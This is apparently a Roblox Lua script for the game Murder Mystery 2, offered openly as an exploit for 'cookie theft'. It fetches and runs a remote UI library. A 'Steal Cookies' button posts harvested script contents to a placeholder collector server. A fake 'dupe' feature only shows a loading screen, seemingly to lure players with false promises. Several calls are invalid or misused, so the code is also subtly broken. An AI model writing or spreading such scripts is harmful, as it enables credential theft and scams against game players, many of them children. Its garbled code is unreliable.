-- MM2 Exploit Script for Cookie Theft

-- UI Setup
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostDots/Roblox-UI-Libraries/main/Lua-Modules.lua"))()
local Window = Library.CreateLib("MM2 Exploit", "Ocean")
local MainTab = Window:NewTab("Main")
local DupeTab = Window:NewTab("Dupe")

-- Cookie Theft Functionality
local HttpService = game:GetService("HttpService")
local function StealCookies()
 local Cookies = {}
 for _, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
 if v:IsA("LocalScript") then
 local Source = v.Source
 if string.match(Source, "cookie") then
 table.insert(Cookies, Source)
 end
 end
 end
 
 -- Send Cookies to Server (Replace URL with your own server)
 HttpService:PostAsync("http://your-cookie-catcher.com/collect", {
 Body = HttpService:JSONEncode(Cookies),
 Headers = {
 ["Content-Type"] = "application/json"
 }
 })
end

-- Fake Dupe Functionality (Does nothing but show loading notification)
local function FakeDupe(ItemName)
 local NotificationGUI = Instance.new("ScreenGui")
 NotificationGUI.Name = "FakeDupeNotification"
 
 local LoadingLabel1 = Instance.new("TextLabel")
 LoadingLabel1.Size = UDim2.fromOffset(200, 50)
 LoadingLabel1.Position = UDim2.fromOffset(600, 350)
 LoadingLabel1.TextColor3.Value(1, 0.5, 0.25) -- Orange color for loading effect
 
 local LoadingLabel2 = Instance.new("TextLabel")
 LoadingLabel2.Size = UDim2.fromOffset(200, 50)
 LoadingLabel2.Position = UDim2.fromOffset(600, 400)
 
 NotificationGUI.Parent = game.StarterGui
 
end

-- UI Elements Setup (Example Dropdown and Button for Weapon Duping)
MainTab:AddButton({
		name="Steal Cookies",
		callback=StealCookies,
})

DupeTab:AddDropdown({
		name="Select Weapon to Dupe",
		list={},
	callback=function(itemName) 
 FakeDupe(itemName) 
	end,
})

